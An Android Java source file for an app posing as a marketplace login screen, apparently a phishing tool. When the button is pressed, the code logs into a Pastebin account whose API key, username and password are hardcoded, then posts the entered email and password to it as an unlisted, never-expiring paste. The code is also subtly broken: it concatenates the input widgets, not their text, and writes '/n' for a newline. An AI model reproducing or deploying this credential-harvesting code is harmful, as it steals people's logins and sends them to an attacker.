package com.orca.marketplace;

import android.os.Bundle;
import android.view.View;
import android.widget.Button;
import android.widget.EditText;

import com.besaba.revonline.pastebinapi.Pastebin;
import com.besaba.revonline.pastebinapi.impl.factory.PastebinFactory;
import com.besaba.revonline.pastebinapi.paste.Paste;
import com.besaba.revonline.pastebinapi.paste.PasteBuilder;
import com.besaba.revonline.pastebinapi.paste.PasteExpire;
import com.besaba.revonline.pastebinapi.paste.PasteVisiblity;
import com.besaba.revonline.pastebinapi.response.Response;

import androidx.appcompat.app.AppCompatActivity;

public class MainActivity extends AppCompatActivity{

    @Override
    protected void onCreate(Bundle savedInstanceState){
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        final EditText e = findViewById(R.id.editTextTextEmailAddress);
        final EditText p = findViewById(R.id.editTextTextPassword);

        final Button b=findViewById(R.id.button);
        b.setOnClickListener(new View.OnClickListener(){
                                 @Override
                                 public void onClick(View view){

                                     final PastebinFactory factory = new PastebinFactory();
                                     final Pastebin pastebin = factory.createPastebin("483e3daa72265716cadef88be40b2ebf");

                                     final Response<String> userLoginKeyResponse = pastebin.login("g4b0m3n", "Sc4m");

                                     if (userLoginKeyResponse.hasError()) {
                                         System.out.println("Impossibile loggarti, " + userLoginKeyResponse.getError());
                                         return;
                                     }

                                     final String userKey = userLoginKeyResponse.get();

                                     final PasteBuilder pasteBuilder = factory.createPaste();
                                     pasteBuilder.setTitle("Domaditos de Dios");
                                     pasteBuilder.setVisiblity(PasteVisiblity.Unlisted); // default=public
                                     pasteBuilder.setMachineFriendlyLanguage("text");
                                     pasteBuilder.setExpire(PasteExpire.Never);
                                     pasteBuilder.setRaw(e+"/n"+p);
                                     // when i'm ready, create the Paste object
                                     final Paste paste = pasteBuilder.build();

                                     // ask to Pastebin to post the paste
                                     // the .post method: if the paste has been published will return the key assigned
                                     // by pastebin
                                     final Response<String> postResult = pastebin.post(paste, userKey);

                                     if (postResult.hasError()) {
                                         System.out.println("Si è verificato un errore mentre postavo il paste: " + postResult.getError());
                                         return;
                                     }

                                     System.out.println("Paste pubblicato! Url: " + postResult.get());
                                 }
                             }
        );
    }

}